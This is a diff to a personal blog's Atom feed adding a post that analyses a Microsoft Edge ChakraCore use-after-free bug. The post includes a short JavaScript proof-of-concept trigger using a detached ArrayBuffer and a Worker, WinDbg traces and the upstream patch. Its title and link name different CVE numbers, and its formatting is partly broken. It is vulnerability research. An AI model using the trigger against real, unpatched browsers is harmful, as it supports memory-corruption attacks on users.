@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://www.math1as.com/"/>
-  <updated>2018-02-07T17:14:47.990Z</updated>
+  <updated>2018-04-10T08:52:49.274Z</updated>
   <id>http://www.math1as.com/</id>
   
   <author>
@@ -15,6 +15,44 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>CVE-2017-0234 analysis</title>
+    <link href="http://www.math1as.com/2018/04/10/CVE-2017-0236-analysis/"/>
+    <id>http://www.math1as.com/2018/04/10/CVE-2017-0236-analysis/</id>
+    <published>2018-04-10T16:51:06.000Z</published>
+    <updated>2018-04-10T08:52:49.274Z</updated>
+    
+    <content type="html"><![CDATA[<p>About another UAF of Microsoft Edge</p><p>debug enviorment: Windows10 + Windbg</p><p>POC</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">&lt;script&gt;</div><div class="line">var buffer = new ArrayBuffer(0x10000);</div><div class="line">var view = new Uint32Array(buffer);</div><div class="line">var worker = new Worker(&apos;uaf1.js&apos;);</div><div class="line">worker.postMessage(buffer,[buffer]);</div><div class="line">worker.terminate();</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure><p>Attach to microsoftedgecp.exe</p><p>first we set breakpoint at the common caller function of chakracore (amd64_call)</p><p>for javascript code</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">var buffer = new ArrayBuffer(0x10000);</div></pre></td></tr></table></figure><p>the debugger stops at</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chakra!Js::ArrayBuffer::NewInstance</div></pre></td></tr></table></figure><p>then it calls the create function</p><p><img src="https://miao.su/images/2018/04/10/19c09b.png" alt="pic1"></p><p>to create an arraybuffer which size=0x10000<br>and rax return a pointer to the arraybuffer object (not the arraybuffer itself)</p><p><img src="https://miao.su/images/2018/04/10/297762.png" alt="pic2"></p><p>and let’s see the construction of this object</p><p>size=0x10000,and there is also a pointer to the address of the arraybuffer</p><p>the javascript call a function to make a typearray based on the arraybuffer</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">var view = new Uint32Array(buffer);</div></pre></td></tr></table></figure><p>the debugger stops at</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">typeArray::NewInstance</div></pre></td></tr></table></figure><p>it is a function template</p><p><img src="https://miao.su/images/2018/04/10/341364.png" alt="pic3"></p><p>and finally rax returns a pointer to the view object</p><p><img src="https://miao.su/images/2018/04/10/493c67.png" alt="pic4"></p><p>there is also a pointer to the arraybuffer</p><p>then javascript calls the constructor of Worker</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">var worker = new Worker(&apos;uaf1.js&apos;);</div></pre></td></tr></table></figure><p>Worker constructor is an external function in edgehtml.dll</p><p>and here we got the key point: Worker calls postMessage function</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">worker.postMessage(buffer,[buffer]);</div></pre></td></tr></table></figure><p><img src="https://miao.su/images/2018/04/10/691419.png" alt="pic5"></p><p>follow the call stack , we get back to chakra.dll</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">02 000000a6`df2fbae0 00007ffa`b581383a chakra!ScriptEngine::GetJavascriptOperationsInternal+0x2d</div><div class="line">03 000000a6`df2fbb10 00007ffa`b581356a EDGEHTML!CMessagePort::ValidateAndConvertTransferableArray+0x46</div><div class="line">04 000000a6`df2fbb90 00007ffa`b4b809ae EDGEHTML!CMessagePort::PrepDataStream+0xd6</div><div class="line">05 000000a6`df2fbc20 00007ffa`b4b80914 EDGEHTML!CMessagePort::PostMessageHelper+0x86</div><div class="line">06 000000a6`df2fbcd0 00007ffa`b55ce812 EDGEHTML!CMessagePort::Var_postMessage+0x58</div><div class="line">07 000000a6`df2fbd30 00007ffa`b4642643 EDGEHTML!CFastDOM::CWorker::Trampoline_postMessage+0x72</div><div class="line">08 000000a6`df2fbd90 00007ffa`b44d9846 chakra!amd64_CallFunction+0x93</div></pre></td></tr></table></figure><p>then edge calls <figure class="highlight plain"><figcaption><span>function</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">surprised, it just call ```chakra!Js::ArrayBuffer::ClearParentsLength``` instead of setting the pointer=null</div><div class="line"></div><div class="line">the source code of this function</div></pre></td></tr></table></figure></p><p>TypedArrayBase::FromVar(parent)-&gt;length = 0;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">so that we could use view object to get memory of the arraybuffer</div><div class="line"></div><div class="line">for there isn&apos;t any check (if arraybuffer is freed?) in jitted code , it turns into a UAF vuln</div><div class="line"></div><div class="line">the patch of microsoft</div><div class="line"></div><div class="line">https://github.com/Microsoft/ChakraCore/commit/1ae7e3ce95515758b4cd7215cb4e48539a0f4031</div></pre></td></tr></table></figure></p><pre><code>case TypeIds_Int32Array:</code></pre><ul><li>if (Int32VirtualArray::Is(parent))</li><li>{</li><li>if (VirtualTableInfo<int32virtualarray>::HasVirtualTable(parent))</int32virtualarray></li><li>{</li><li>VirtualTableInfo<int32array>::SetVirtualTable(parent);</int32array></li><li>}</li><li>else</li><li>{</li><li>Assert(VirtualTableInfo<crosssiteobject<int32virtualarray>&gt;::HasVirtualTable(parent));</crosssiteobject<int32virtualarray></li><li>VirtualTableInfo<crosssiteobject<int32array>&gt;::SetVirtualTable(parent);</crosssiteobject<int32array></li><li>}</li><li>}</li><li>TypedArrayBase::FromVar(parent)-&gt;ClearLengthAndBufferOnDetach();</li><li><p>break;<br>+</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">for detach operation</div></pre></td></tr></table></figure></li><li><p>void DataView::ClearLengthAndBufferOnDetach()</p></li><li>{</li><li>AssertMsg(this-&gt;GetArrayBuffer()-&gt;IsDetached(), “Array buffer should be detached if we’re calling this method”);<br>+</li><li>this-&gt;length = 0;</li><li>this-&gt;buffer = nullptr;</li><li>}<br>+<br>```</li></ul><p>okay, they set the pointer=null, and also set the virtual table of view object to its parent’s (arraybuffer object) virtual table</p><p>to draw a conclusion , we could see this vuln is similar to CVE-2017-0234</p><p>there are some common features they shared</p><ol><li><p>jitted code does not check some important data</p></li><li><p>edge does not crash, it handle the access violation exception</p></li><li><p>if we could read &amp; write at the same time, it’s easy to make an exploit</p></li></ol>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;About another UAF of Microsoft Edge&lt;/p&gt;
+&lt;p&gt;debug enviorment: Windows10 + Windbg&lt;/p&gt;
+&lt;p&gt;POC&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr
+      
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>CVE-2017-0236-analysis</title>
+    <link href="http://www.math1as.com/2018/04/10/index/"/>
+    <id>http://www.math1as.com/2018/04/10/index/</id>
+    <published>2018-04-10T07:56:25.000Z</published>
+    <updated>2018-04-10T07:56:25.498Z</updated>
+    
+    <summary type="html">
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>CVE-2017-0234 analysis</title>
